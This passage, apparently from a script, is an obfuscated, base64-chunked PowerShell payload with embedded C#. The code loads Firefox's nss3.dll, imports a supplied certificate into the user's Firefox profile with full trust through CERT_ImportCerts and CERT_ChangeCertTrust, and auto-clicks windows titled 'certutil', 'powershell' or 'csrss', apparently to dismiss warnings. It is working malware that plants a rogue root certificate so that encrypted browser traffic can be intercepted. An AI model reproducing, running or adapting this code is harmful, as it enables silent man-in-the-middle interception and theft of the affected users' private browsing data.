tZS5Ub1N0cmlu&quot;+&quot;ZygpLHRpdGxlLlRvU3RyaW5nKCksc0VOKTsKICAgICAgICAJaWYoc0VOLkNvbnRhaW5zKCJjc3JzcyIpIHx8IHNFTi5Db250YWlucygiY2VydHV0aWwiKSAgfHwgc0VOLkNvbnRhaW5zKCJwb3dlcnNoZWxsIikpCgkgICAgICAgIHsKCQkgICAgICAgIGRhdGEuaFdu&quot;+&quot;ZCA9IGhXbmQ7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CgkgICAgICAgIH0KICAgICAgICB9CiAgICAgICAJCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgCglwdWJsaWMgc3RhdGljIFN0cmluZyB2aGRISihJbnRQdHIgZVNldEpRdWlsdkFNKXsK&quot;+&quot;CQl1aW50IEZMb29qID0gMDsKCQl1aW50IHRocmVhZElEID0gR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkKGVTZXRKUXVpbHZBTSwgb3V0IEZMb29qKTsKCQlTdHJpbmcgc1Byb2MgPSBudWxsOwoJICAgIEludFB0ciBoYW5kbGVUb1NuYXBzaG90ID0gSW50UHRyLlpl&quot;+&quot;cm87CgkgICAgdHJ5CgkgICAgewoJICAgICAgICBQUk9DRVNTRU5UUlkzMiBESWQgPSBuZXcgUFJPQ0VTU0VOVFJZMzIoKTsKCSAgICAgICAgRElkLmR3U2l6ZSA9IChVSW50MzIpTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NFTlRSWTMyKSk7CgkgICAgICAg&quot;+&quot;IGhhbmRsZVRvU25hcHNob3QgPSBDcmVhdGVUb29saGVscDMyU25hcHNob3QoKHVpbnQpU25hcHNob3RGbGFncy5Qcm9jZXNzLCAwKTsKCSAgICAgICAgaWYgKFByb2Nlc3MzMkZpcnN0KGhhbmRsZVRvU25hcHNob3QsIHJlZiBESWQpKQoJICAgICAgICB7CgkgICAg&quot;+&quot;ICAgIGRvCgkgICAgICAgIHsKCSAgICAgICAgICAgIGlmIChGTG9vaiA9PSBESWQudGgzMlByb2Nlc3NJRCkKCSAgICAgICAgICAgIHsKCSAgICAgICAgICAgIHNQcm9jID0gRElkLnN6RXhlRmlsZTsKCSAgICAgICAgICAgIGJyZWFrOwoJICAgICAgICAgICAgfQoJ&quot;+&quot;ICAgICAgICB9IHdoaWxlIChQcm9jZXNzMzJOZXh0KGhhbmRsZVRvU25hcHNob3QsIHJlZiBESWQpKTsKCSAgICAgICAgfQoJICAgICAgICBlbHNlCgkgICAgICAgIHsKCSAgICAgICAgCXRocm93IG5ldyBBcHBsaWNhdGlvbkV4Y2VwdGlvbihzdHJpbmcuRm9ybWF0&quot;+&quot;KCJGYWlsZWQgd2l0aCB3aW4zMiBlcnJvciBjb2RlIHswfSIsIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSkpOwoJICAgICAgICB9CgkgICAgfQoJICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCgkgICAgewoJICAgICAgICB0aHJvdyBuZXcgQXBwbGljYXRpb25F&quot;+&quot;eGNlcHRpb24oIkNhbid0IGdldCB0aGUgcHJvY2Vzcy4iLCBleCk7CgkgICAgfQoJICAgIGZpbmFsbHkKCSAgICB7CgkgICAgICAgIENsb3NlSGFuZGxlKGhhbmRsZVRvU25hcHNob3QpOwoJICAgIH0KCSAgICByZXR1cm4gc1Byb2M7Cgl9CglwdWJsaWMgc3RhdGlj&quot;+&quot;IGJvb2wgT3NNZmdLZVVFZUxoKEludFB0ciBoV25kLCBJbnRQdHIgbFBhcmFtKQoJewoJCVNlbmRNZXNzYWdlKGhXbmQsIEJNX0NMLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwoJCXJldHVybiB0cnVlOwoJfQp9CiJAOwpbSml4UENVZl06OklqV0ZuZE5LWnYo&quot;+&quot;IiVDRVJUJSIpOwpleGl0Cn0KUFlaT0lnWFI=&quot;,    dDrnVhWm: &quot;ZnVuY3Rpb24gTEdDeHdCTUhha3sKQWRkLVR5cGUgQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uSU87CnVzaW5nIE1pY3Jv&quot;+&quot;c29mdC5XaW4zMjsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9k&quot;+&quot;ZWw7CgpwdWJsaWMgc2VhbGVkIGNsYXNzIEVoZG1IR21MQnpNWEtsCnsKCXByaXZhdGUgc3RhdGljIHZvbGF0aWxlIEVoZG1IR21M&quot;+&quot;QnpNWEtsIENUUFBrbU1nZmdGbjsKCXByaXZhdGUgc3RhdGljIG9iamVjdCB2eWpSY1FxSWJScURPbiA9IG5ldyBPYmplY3QoKTsK&quot;+&quot;CXB1YmxpYyBzdGF0aWMgRWhkbUhHbUxCek1YS2wgTW1NYVJ1d3VoQlJaQ1IoKQogICAgewogICAgICAgIGlmIChDVFBQa21NZ2Zn&quot;+&quot;Rm4gPT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIGxvY2sgKHZ5alJjUXFJYlJxRE9uKQogICAgICAgICAgICB7CiAgICAg&quot;+&quot;ICAgICAgICAgICBpZiAoQ1RQUGttTWdmZ0ZuID09IG51bGwpCiAgICAgICAgICAgICAgICBDVFBQa21NZ2ZnRm4gPSBuZXcgRWhk&quot;+&quot;bUhHbUxCek1YS2woKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gQ1RQUGttTWdmZ0ZuOwogICAgfQoJ&quot;+&quot;Cgljb25zdCBpbnQgT0dlPTA7CiAgICAKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hh&quot;+&quot;clNldCA9IENoYXJTZXQuQW5zaSldCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShbTWFyc2hhbEFzKFVubWFu&quot;+&quot;YWdlZFR5cGUuTFBTdHIpXXN0cmluZyBscEZpbGVOYW1lKTsKCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgWHVYKHN0cmluZyBs&quot;+&quot;aWJQYXRoKQogICAgewogICAgICAgIGlmIChTdHJpbmcuSXNOdWxsT3JFbXB0eShsaWJQYXRoKSkKICAgICAgICAgICAgdGhyb3cg&quot;+&quot;bmV3IEFyZ3VtZW50TnVsbEV4Y2VwdGlvbigibGliUGF0aCIpOwoKICAgICAgICBJbnRQdHIgbW9kdWxlSGFuZGxlID0gTG9hZExp&quot;+&quot;YnJhcnkobGliUGF0aCk7CiAgICAgICAgaWYgKG1vZHVsZUhhbmRsZSA9PSBJbnRQdHIuWmVybykKICAgICAgICB7CiAgICAgICAg&quot;+&quot;ICAgIGludCBsYXN0ZXJyb3IgPSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xl&quot;+&quot;LldyaXRlTGluZShTdHJpbmcuRm9ybWF0KCJMYXN0IGVycm9yOiAweHswOlh9IixsYXN0ZXJyb3IpKTsKICAgICAgICAgICAgV2lu&quot;+&quot;MzJFeGNlcHRpb24gaW5uZXJFeCA9IG5ldyBXaW4zMkV4Y2VwdGlvbihsYXN0ZXJyb3IpOwogICAgICAgICAgICBpbm5lckV4LkRh&quot;+&quot;dGEuQWRkKCJMYXN0V2luMzJFcnJvciIsIGxhc3RlcnJvcik7CiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oImNhbid0&quot;+&quot;IGxvYWQgRExMICIgKyBsaWJQYXRoLCBpbm5lckV4KTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIG1vZHVsZUhhbmRsZTsKICAg&quot;+&quot;IH0KCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9j&quot;+&quot;QWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NlZHVyZU5hbWUpOwoJLy9Db25zdGFudHMKICAgIGNvbnN0IHVpbnQg&quot;+&quot;TlNTX0lOSVRfUkVBRE9OTFk9MHgxOwogICAgY29uc3QgdWludCBOU1NfSU5JVF9OT0NFUlREQiA9IDB4MjsKICAgIGNvbnN0IHVp&quot;+&quot;bnQgTlNTX0lOSVRfTk9NT0REQiA9IDB4NDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfRk9SQ0VPUEVOID0gMHg4OwogICAgY29u&quot;+&quot;c3QgdWludCBOU1NfSU5JVF9OT1JPT1RJTklUID0gMHgxMDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfT1BUSU1JWkVTUEFDRSA9&quot;+&quot;IDB4MjA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX1BLMTFUSFJFQURTQUZFID0gMHg0MDsKICAgIGNvbnN0IHVpbnQgTlNTX0lO&quot;+&quot;SVRfUEsxMVJFTE9BRCA9IDB4ODA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX05PUEsxMUZJTkFMSVpFID0gMHgxMDA7CiAgICBj&quot;+&quot;b25zdCB1aW50IE5TU19JTklUX1JFU0VSVkVEID0gMHgyMDA7CiAgICBjb25zdCB1aW50IE5TU19JTklUX0NPT1BFUkFURSA9IE5T&quot;+&quot;U19JTklUX1BLMTFUSFJFQURTQUZFIHwgTlNTX0lOSVRfUEsxMVJFTE9BRCB8IE5TU19JTklUX05PUEsxMUZJTkFMSVpFIHwgTlNT&quot;+&quot;X0lOSVRfUkVTRVJWRUQ7CgogICAgY29uc3Qgc3RyaW5nIFNFQ01PRF9EQiA9ICJzZWNtb2QuZGIiOwogICAgLy9TdHJ1Y3R1cmVz&quot;+&quot;CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IFNFQ0l0ZW0gCiAgICB7&quot;+&quot;CiAgICAgICAgcHVibGljIHVpbnQgaVR5cGU7CiAgICAgICAgcHVibGljIEludFB0ciBiRGF0YTsKICAgICAgICBwdWJsaWMgdWlu&quot;+&quot;dCBpRGF0YUxlbjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0&quot;+&quot;cnVjdCBDZXJ0VHJ1c3RzCiAgICB7CiAgICAgICAgcHVibGljIGludCBpU2l0ZTsKICAgICAgICBwdWJsaWMgaW50IGlFbWFpbDsK&quot;+&quot;ICAgICAgICBwdWJsaWMgaW50IGlTb2Z0OwogICAgfQoKICAgIHByaXZhdGUgZW51bSBTRUNDZXJ0VXNhZ2UKICAgIHsKICAgICAg&quot;+&quot;ICBjZXJ0VXNhZ2VTU0xDbGllbnQgPSAwLAogICAgICAgIGNlcnRVc2FnZVNTTFNlcnZlciA9IDEsCiAgICAgICAgY2VydFVzYWdl&quot;+&quot;U1NMU2VydmVyV2l0aFN0ZXBVcCA9IDIsCiAgICAgICAgY2VydFVzYWdlU1NMQ0EgPSAzLAogICAgICAgIGNlcnRVc2FnZUVtYWls&quot;+&quot;U2lnbmVyID0gNCwKICAgICAgICBjZXJ0VXNhZ2VFbWFpbFJlY2lwaWVudCA9IDUsCiAgICAgICAgY2VydFVzYWdlT2JqZWN0U2ln&quot;+&quot;bmVyID0gNiwKICAgICAgICBjZXJ0VXNhZ2VVc2VyQ2VydEltcG9ydCA9IDcsCiAgICAgICAgY2VydFVzYWdlVmVyaWZ5Q0EgPSA4&quot;+&quot;LAogICAgICAgIGNlcnRVc2FnZVByb3RlY3RlZE9iamVjdFNpZ25lciA9IDksCiAgICAgICAgY2VydFVzYWdlU3RhdHVzUmVzcG9u&quot;+&quot;ZGVyID0gMTAsCiAgICAgICAgY2VydFVzYWdlQW55Q0EgPSAxMQogICAgfQoJW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxs&quot;+&quot;aW5nQ29udmVudGlvbi5DZGVjbCldCiAgICBwcml2YXRlIGRlbGVnYXRlIGludCBGQ1lyeERMU3Ioc3RyaW5nIHNDb25maWdEaXIs&quot;+&quot;IHN0cmluZyBjZXJ0UHJlZml4LCBzdHJpbmcga2V5UHJlZml4LCBzdHJpbmcgc2VjTW9kTmFtZSwgdWludCBmbGFncyk7CgogICAg&quot;+&quot;cHJpdmF0ZSBpbnQgU2JpZChzdHJpbmcgc0NvbmZpZ0Rpciwgc3RyaW5nIGNlcnRQcmVmaXgsIHN0cmluZyBrZXlQcmVmaXgsIHN0&quot;+&quot;cmluZyBzZWNNb2ROYW1lLCB1aW50IGZsYWdzKQogICAgewogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKHFB&quot;+&quot;aVNidG9pbywgIk5TU19Jbml0aWFsaXplIik7CiAgICAgICAgRkNZcnhETFNyIHB0ciA9IChGQ1lyeERMU3IpTWFyc2hhbC5HZXRE&quot;+&quot;ZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKEZDWXJ4RExTcikpOwogICAgICAgIHJldHVybiBwdHIoc0Nv&quot;+&quot;bmZpZ0RpciwgY2VydFByZWZpeCwga2V5UHJlZml4LCBzZWNNb2ROYW1lLCBmbGFncyk7CiAgICB9CgogICAgW1VubWFuYWdlZEZ1&quot;+&quot;bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCldCiAgICBwcml2YXRlIGRlbGVnYXRlIEludFB0ciBZTWUoKTsK&quot;+&quot;ICAgIHByaXZhdGUgSW50UHRyIHFIbGh4UEdSZSgpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3Mo&quot;+&quot;cUFpU2J0b2lvLCAiQ0VSVF9HZXREZWZhdWx0Q2VydERCIik7CiAgICAgICAgWU1lIHB0ciA9IChZTWUpTWFyc2hhbC5HZXREZWxl&quot;+&quot;Z2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFlNZSkpOwogICAgICAgIHJldHVybiBwdHIoKTsKICAgIH0KCiAg&quot;+&quot;ICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0KICAgIHByaXZhdGUgZGVsZWdhdGUg&quot;+&quot;SW50UHRyIFJjV0JjVEUoKTsKICAgIHByaXZhdGUgSW50UHRyIFJrdEVJTHV5U0goKQogICAgewogICAgICAgIEludFB0ciBwUHJv&quot;+&quot;YyA9IEdldFByb2NBZGRyZXNzKHFBaVNidG9pbywgIk5TU19TaHV0ZG93biIpOwogICAgICAgIFJjV0JjVEUgcHRyID0gKFJjV0Jj&quot;+&quot;VEUpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKFJjV0JjVEUpKTsKICAgICAgICBy&quot;+&quot;ZXR1cm4gcHRyKCk7CiAgICB9CgogICAgW1VubWFuYWdlZEZ1bmN0aW9uUG9pbnRlcihDYWxsaW5nQ29udmVudGlvbi5DZGVjbCld&quot;+&quot;CiAgICBwcml2YXRlIGRlbGVnYXRlIGludCBmRm90bXJLKEludFB0ciBjZXJ0ZGIsIGludCB1c2FnZSwgdWludCBuY2VydHMsIHJl&quot;+&quot;ZiBTRUNJdGVtW10gZGVyQ2VydHMsIHJlZiBJbnRQdHIgcmV0Q2VydHMsIHVpbnQga2VlcENlcnRzLCB1aW50IGNhT25seSwgSW50&quot;+&quot;UHRyIG5pY2tuYW1lKTsKICAgIHByaXZhdGUgaW50IHZRWUMoSW50UHRyIGNlcnRkYiwgaW50IHVzYWdlLCB1aW50IG5jZXJ0cywg&quot;+&quot;cmVmIFNFQ0l0ZW1bXSBkZXJDZXJ0cywgcmVmIEludFB0ciByZXRDZXJ0cywgdWludCBrZWVwQ2VydHMsIHVpbnQgY2FPbmx5LCBJ&quot;+&quot;bnRQdHIgbmlja25hbWUpCiAgICB7CiAgICAgICAgSW50UHRyIHBQcm9jID0gR2V0UHJvY0FkZHJlc3MocUFpU2J0b2lvLCAiQ0VS&quot;+&quot;VF9JbXBvcnRDZXJ0cyIpOwogICAgICAgIGZGb3RtcksgcHRyID0gKGZGb3RtckspTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0&quot;+&quot;aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKGZGb3RtckspKTsKICAgICAgICByZXR1cm4gcHRyKGNlcnRkYiwgdXNhZ2UsIG5jZXJ0&quot;+&quot;cywgcmVmIGRlckNlcnRzLCByZWYgcmV0Q2VydHMsIGtlZXBDZXJ0cywgY2FPbmx5LCBuaWNrbmFtZSk7CiAgICB9CgogICAgcHJp&quot;+&quot;dmF0ZSBkZWxlZ2F0ZSBpbnQgSExHKEludFB0ciBjZXJ0ZGIsIEludFB0ciBjZXJ0LCByZWYgQ2VydFRydXN0cyB0cnVzdCk7CiAg&quot;+&quot;ICBwcml2YXRlIGludCBLSW5ReWooSW50UHRyIGNlcnRkYiwgSW50UHRyIGNlcnQsIHJlZiBDZXJ0VHJ1c3RzIHRydXN0KQogICAg&quot;+&quot;ewogICAgICAgIEludFB0ciBwUHJvYyA9IEdldFByb2NBZGRyZXNzKHFBaVNidG9pbywgIkNFUlRfQ2hhbmdlQ2VydFRydXN0Iik7&quot;+&quot;CiAgICAgICAgSExHIHB0ciA9IChITEcpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9m&quot;+&quot;KEhMRykpOwogICAgICAgIHJldHVybiBwdHIoY2VydGRiLCBjZXJ0LCByZWYgdHJ1c3QpOwogICAgfQoKICAgIFtVbm1hbmFnZWRG&quot;+&quot;dW5jdGlvblBvaW50ZXIoQ2FsbGluZ0NvbnZlbnRpb24uQ2RlY2wpXQogICAgcHVibGljIGRlbGVnYXRlIGludCBMa3lsbXlMbShJ&quot;+&quot;bnRQdHIgY2VydCwgdWludCBuY2VydHMpOwogICAgcHJpdmF0ZSBpbnQgaG9SS3VBbVZUKEludFB0ciBjZXJ0LCB1aW50IG5jZXJ0&quot;+&quot;cykKICAgIHsKICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhxQWlTYnRvaW8sICJDRVJUX0Rlc3Ryb3lDZXJ0&quot;+&quot;QXJyYXkiKTsKICAgICAgICBMa3lsbXlMbSBwdHIgPSAoTGt5bG15TG0pTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9p&quot;+&quot;bnRlcihwUHJvYywgdHlwZW9mKExreWxteUxtKSk7CiAgICAgICAgcmV0dXJuIHB0cihjZXJ0LCBuY2VydHMpOwogICAgfQoKCXBy&quot;+&quot;aXZhdGUgSW50UHRyIHFBaVNidG9pbyA9IEludFB0ci5aZXJvOwoJCglwdWJsaWMgQm9vbGVhbiB5SnVXeGRseXVOKFN0cmluZyBz&quot;+&quot;Q2VydCl7CiAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJFaGRtSEdtTEJ6TVhLbCBTdGFydCIpOwoJCVN0cmluZyBz&quot;+&quot;UHJvZmlsZSA9IEdldFByb2ZpbGUoKTsKICAgICAgICBpZiAoU3RyaW5nLklzTnVsbE9yRW1wdHkoc1Byb2ZpbGUpKQogICAgICAg&quot;+&quot;IHsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJQcm9maWxlIG5vdCBmb3VuZCIpOwogICAgICAgICAgICBy&quot;+&quot;ZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiUHJvZmlsZSBwYXRoPSIrc1By&quot;+&quot;b2ZpbGUpOwogICAgICAgIGJ5dGVbXSBiQ2VydCA9IEdldENlcnRBc0J5dGVBcnJheShzQ2VydCk7CgkJSW50UHRyIGlwQ2VydCA9&quot;+&quot;IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGJDZXJ0Lkxlbmd0aCk7CgkJdHJ5CiAgICAgICAgewogICAgICAgICAgICBEaXJlY3RvcnlJ&quot;+&quot;bmZvIGRpSW5zdGFsbFBhdGggPSBHZXRJUCgpOwogICAgICAgICAgICBTdHJpbmcgc0N1cnJlbnREaXJlY3RvcnkgPSBEaXJlY3Rv&quot;+&quot;cnkuR2V0Q3VycmVudERpcmVjdG9yeSgpOwogICAgICAgICAgICBEaXJlY3RvcnkuU2V0Q3VycmVudERpcmVjdG9yeShkaUluc3Rh&quot;+&quot;bGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJJbnN0YWxsIHBhdGg9IitkaUlu&quot;+&quot;c3RhbGxQYXRoLkZ1bGxOYW1lKTsKICAgICAgICAgICAgZm9yZWFjaChGaWxlSW5mbyBmaURsbCBpbiBkaUluc3RhbGxQYXRoLkdl&quot;+&quot;dEZpbGVzKCIqLmRsbCIpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoZmlEbGwuTmFtZS5FcXVhbHMoImJyZWFr&quot;+&quot;cGFkaW5qZWN0b3IuZGxsIikpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgWHVYKGZpRGxsLkZ1bGxOYW1lKTsKICAgICAgICAg&quot;+&quot;ICAgfQogICAgICAgICAgICBxQWlTYnRvaW8gPSBYdVgoZGlJbnN0YWxsUGF0aC5GdWxsTmFtZSArICJcXG5zczMuZGxsIik7CiAg&quot;+&quot;ICAgICAgICAgIGlmIChxQWlTYnRvaW8uRXF1YWxzKEludFB0ci5aZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAg&quot;+&quot;U3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJGaXJlZm94IGluc3RhbGwgZGlyZWN0b3J5IG5vdCBmb3VuZCIpOwogICAgICAgICAg&quot;+&quot;ICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIERpcmVjdG9yeS5TZXRDdXJyZW50RGlyZWN0b3J5&quot;+&quot;KHNDdXJyZW50RGlyZWN0b3J5KTsKICAgICAgICAgICAgLy9Jbml0IGNlcnQKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJDZXJ0&quot;+&quot;LCAwLCBpcENlcnQsIGJDZXJ0Lkxlbmd0aCk7CiAgICAgICAgICAgIFNFQ0l0ZW0gQ2VydEl0ZW0gPSBuZXcgU0VDSXRlbSgpOwog&quot;+&quot;ICAgICAgICAgICBDZXJ0SXRlbS5pVHlwZSA9IDM7CiAgICAgICAgICAgIENlcnRJdGVtLmJEYXRhID0gaXBDZXJ0OwogICAgICAg&quot;+&quot;ICAgICBDZXJ0SXRlbS5pRGF0YUxlbiA9ICh1aW50KWJDZXJ0Lkxlbmd0aDsKICAgICAgICAgICAgU0VDSXRlbVtdIGFDZXJ0SXRl&quot;+&quot;bSA9IG5ldyBTRUNJdGVtWzFdOwogICAgICAgICAgICBhQ2VydEl0ZW1bMF0gPSBDZXJ0SXRlbTsKCiAgICAgICAgICAgIENlcnRU&quot;+&quot;cnVzdHMgQ2VydFRydXN0ID0gbmV3IENlcnRUcnVzdHMoKTsKICAgICAgICAgICAgQ2VydFRydXN0LmlTaXRlID0gMHgxMDsKICAg&quot;+&quot;ICAgICAgICAgQ2VydFRydXN0LmlFbWFpbCA9IDB4MTA7CiAgICAgICAgICAgIENlcnRUcnVzdC5pU29mdCA9IDB4MTA7CiAgICAg&quot;+&quot;ICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiSW5pdCBjZXJ0IE9LIik7CiAgICAgICAgICAgIC8vRW5kIGluaXQgY2Vy&quot;+&quot;dAogICAgICAgICAgICBpbnQgc3RhdHVzID0gU2JpZChzUHJvZmlsZSwgIiIsICIiLCBTRUNNT0RfREIsIE5TU19JTklUX09QVElN&quot;+&quot;SVpFU1BBQ0UpOwogICAgICAgICAgICBpZiAoc3RhdHVzICE9IE9HZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lz&quot;+&quot;dGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIk5TU19Jbml0UmVhZFdyaXRlIEVSUk9SLiBTdGF0dXM6IDB4ezA6&quot;+&quot;WH07TGFzdCBlcnJvcjogMHh7MDpYfSIsIHN0YXR1cywgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKSk7CiAgICAgICAgICAg&quot;+&quot;ICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW50UHRyIGJkID0gcUhsaHhQR1JlKCk7CiAgICAg&quot;+&quot;ICAgICAgIGlmIChiZCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUu&quot;+&quot;V3JpdGVMaW5lKCJDRVJUX0dldERlZmF1bHRDZXJ0REIgRmFpbGVkIik7CiAgICAgICAgICAgICAgICBSa3RFSUx1eVNIKCk7CiAg&quot;+&quot;ICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVM&quot;+&quot;aW5lKCJDRVJUX0dldERlZmF1bHRDZXJ0REIgT0siKTsKICAgICAgICAgICAgSW50UHRyIENlcnRUb0ltcG9ydCA9IG5ldyBJbnRQ&quot;+&quot;dHIoKTsKICAgICAgICAgICAgSW50UHRyW10gYUNlcnRUb0ltcG9ydCA9IG5ldyBJbnRQdHJbMV07CiAgICAgICAgICAgIHN0YXR1&quot;+&quot;cyA9IHZRWUMoYmQsIDExLCAxLCByZWYgYUNlcnRJdGVtLCByZWYgQ2VydFRvSW1wb3J0LCAxLCAwLCBJbnRQdHIuWmVybyk7CiAg&quot;+&quot;ICAgICAgICAgIGlmIChzdGF0dXMgIT0gT0dlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTeXN0ZW0uQ29uc29sZS5X&quot;+&quot;cml0ZUxpbmUoU3RyaW5nLkZvcm1hdCgiQ0VSVF9JbXBvcnRDZXJ0cyBFUlJPUi4gU3RhdHVzOiAweHswOlh9O0xhc3QgZXJyb3I6&quot;+&quot;IDB4ezA6WH0iLCBzdGF0dXMsIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSkpOwogICAgICAgICAgICAgICAgUmt0RUlMdXlT&quot;+&quot;SCgpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xl&quot;+&quot;LldyaXRlTGluZSgiQ0VSVF9JbXBvcnRDZXJ0cyBPSyIpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoQ2VydFRvSW1wb3J0LCBh&quot;+&quot;Q2VydFRvSW1wb3J0LCAwLCAxKTsKICAgICAgICAgICAgc3RhdHVzID0gS0luUXlqKGJkLCBhQ2VydFRvSW1wb3J0WzBdLCByZWYg&quot;+&quot;Q2VydFRydXN0KTsKICAgICAgICAgICAgaWYgKCBzdGF0dXMgIT0gT0dlKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAg&quot;+&quot;U3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIkNFUlRfQ2hhbmdlQ2VydFRydXN0IEVSUk9SLiBTdGF0dXM6&quot;+&quot;IDB4ezA6WH07TGFzdCBlcnJvcjogMHh7MDpYfSIsIHN0YXR1cywgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKSk7CiAgICAg&quot;+&quot;ICAgICAgICAgICBSa3RFSUx1eVNIKCk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH07CiAgICAg&quot;+&quot;ICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3QgT0siKTsKICAgICAgICAgICAgaG9S&quot;+&quot;S3VBbVZUKENlcnRUb0ltcG9ydCwgMSk7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQWRkIGNlcnQgT0si&quot;+&quot;KTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbil7fQogICAgICAgIGZpbmFsbHkKICAgICAgICB7CiAgICAgICAg&quot;+&quot;ICAgIFJrdEVJTHV5U0goKTsKICAgICAgICB9CgkJcmV0dXJuIHRydWU7Cgl9Cglwcml2YXRlIFN0cmluZyBHZXRQcm9maWxlKCkK&quot;+&quot;ICAgIHsKICAgICAgICBTdHJpbmcgRkZQcm9maWxlID0gUGF0aC5Db21iaW5lKEVudmlyb25tZW50LkdldEVudmlyb25tZW50VmFy&quot;+&quot;aWFibGUoIkFQUERBVEEiKSwgQCJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXMiKTsKICAgICAgICBpZiAoRGlyZWN0b3J5LkV4aXN0&quot;+&quot;cyhGRlByb2ZpbGUpKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKERpcmVjdG9yeS5HZXREaXJlY3RvcmllcyhGRlByb2ZpbGUs&quot;+&quot;ICIqLmRlZmF1bHQiKS5MZW5ndGggPiAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm4gRGlyZWN0b3J5Lkd